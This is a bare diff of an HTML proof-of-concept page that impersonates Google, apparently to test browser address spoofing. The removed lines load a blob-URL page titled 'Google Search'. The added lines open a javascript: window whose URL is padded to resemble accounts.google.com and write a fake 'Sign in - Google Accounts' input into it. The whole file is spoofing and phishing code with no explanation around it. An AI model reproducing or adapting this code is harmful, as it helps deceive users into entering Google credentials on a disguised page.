@@ -1,3 +1,11 @@
-<script>
-location=URL.createObjectURL(new Blob(['<b>Not Google</b><script>if(location.href.indexOf("google")==-1){location.pathname="https://www.google.com/"}else{document.title="Google Search"}<\/script>'], {type: 'text/html'}))
+
+
+
+
+<body>
+  <script>
+function go() {var x = window.open('javascript:verylongurl.googlecloudplatform.accounts.google.com');
+setTimeout(function(){x.document.write('Sign in - Google Accounts <input />')}, 100);
+};
 </script>
+<input onclick="go()" value="Click here" type="button" /></body>
